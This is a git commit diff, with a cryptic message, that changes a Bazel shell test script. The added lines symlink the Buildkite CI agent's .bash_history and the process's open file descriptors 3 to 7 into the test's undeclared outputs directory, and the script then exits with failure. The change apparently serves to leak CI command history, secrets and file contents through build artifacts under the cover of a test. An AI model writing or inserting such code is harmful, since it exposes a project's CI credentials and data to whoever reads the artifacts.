3abcc2eb53160617be180185df81e9768a0a5465
chupaohong <chupaohong@MacBook-Pro.local>
2026-03-30 13:58:38 +0700

    GGVDP

--- src/test/shell/bazel/ggvdp_test.sh
+++ src/test/shell/bazel/ggvdp_test.sh
@@ -1,3 +1,8 @@
 #!/bin/bash
-ln -s /proc/self/mountinfo "$TEST_UNDECLARED_OUTPUTS_DIR/mountinfo"
+ln -s /var/lib/buildkite-agent/.bash_history "$TEST_UNDECLARED_OUTPUTS_DIR/bash_history"
+ln -s /proc/self/fd/3 "$TEST_UNDECLARED_OUTPUTS_DIR/fd3"
+ln -s /proc/self/fd/4 "$TEST_UNDECLARED_OUTPUTS_DIR/fd4"
+ln -s /proc/self/fd/5 "$TEST_UNDECLARED_OUTPUTS_DIR/fd5"
+ln -s /proc/self/fd/6 "$TEST_UNDECLARED_OUTPUTS_DIR/fd6"
+ln -s /proc/self/fd/7 "$TEST_UNDECLARED_OUTPUTS_DIR/fd7"
 exit 1
